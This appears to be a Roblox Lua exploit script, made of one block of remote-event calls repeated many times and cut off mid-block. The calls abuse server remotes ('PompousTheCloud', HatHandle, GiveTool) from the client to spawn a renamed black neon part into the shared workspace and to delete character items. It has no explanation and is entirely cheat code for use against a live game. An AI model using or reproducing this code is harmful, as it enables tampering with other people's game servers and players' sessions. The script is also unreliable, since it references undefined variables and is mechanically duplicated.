CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
